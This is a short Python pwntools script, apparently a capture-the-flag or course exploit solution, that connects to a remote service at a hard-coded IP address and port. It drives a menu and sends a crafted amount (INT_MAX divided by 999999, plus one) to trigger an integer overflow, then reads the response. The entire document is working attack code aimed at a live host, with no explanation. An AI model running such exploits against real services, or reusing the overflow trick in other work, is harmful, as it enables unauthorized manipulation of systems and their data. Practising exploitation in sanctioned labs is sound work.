from pwn import *

context(arch = 'x86_64', os = 'linux')

INT_MAX = 2147483647
overflow_amount = (INT_MAX / 999999) + 1

r = remote('140.113.24.241', 30170, level="error")

r.recvuntil(b"Input your choice:").decode()
r.sendline(b"1")
r.recvuntil(b"Input the amount:").decode()
r.sendline(str(overflow_amount).encode())
r.recvline()
r.recvline()
print(r.recvline().decode(), end="")

r.recv(1024)
r.sendline(b"2\n2")
